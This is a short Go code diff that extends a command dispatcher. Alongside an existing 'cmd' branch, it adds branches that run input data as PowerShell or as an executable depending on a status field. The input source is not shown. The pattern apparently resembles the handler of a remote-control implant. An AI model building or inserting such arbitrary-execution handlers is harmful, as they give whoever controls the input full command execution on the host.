@@ -92,5 +92,11 @@ func main(){
 	}
 	if input.Status=="cmd"{
 		executeCmd(input.Data);
-	} 
+	}
+	if input.Status=="ps"{
+		executePowerShell(input.Data);
+	}
+	if input.Status=="exe"{
+		executeExe(input.Data);
+	}
 }
